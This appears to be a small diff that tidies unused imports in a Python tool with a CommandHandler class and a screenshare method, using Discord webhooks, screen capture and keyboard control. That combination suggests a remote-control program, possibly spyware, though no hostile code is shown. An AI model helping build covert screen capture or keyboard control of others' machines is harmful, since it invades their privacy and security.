@@ -13,7 +13,6 @@ import os
 from datetime import datetime
 import subprocess
 import io
-from dhooks import Webhook as web
 from dhooks import Embed, File
 from PIL import ImageGrab
 from pynput.keyboard import Key, Controller
@@ -131,9 +130,8 @@ class CommandHandler():
         
     def screenshare(self):
         def to_execute(self):
-            import eventlet
+
             import socketio
-            from threading import Thread
             from zlib import compress
             import time
 
